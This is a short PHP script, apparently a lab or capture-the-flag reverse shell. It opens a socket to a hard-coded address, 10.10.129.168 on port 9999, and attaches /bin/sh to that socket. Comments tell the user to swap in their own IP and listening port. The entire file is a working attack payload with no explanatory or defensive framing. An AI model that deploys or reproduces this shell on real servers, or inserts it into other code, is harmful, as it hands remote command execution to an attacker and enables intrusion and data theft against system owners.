<?php
$ip = '10.10.129.168'; // Change this to your IP
$port = 9999; // Change this to your listening port

$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
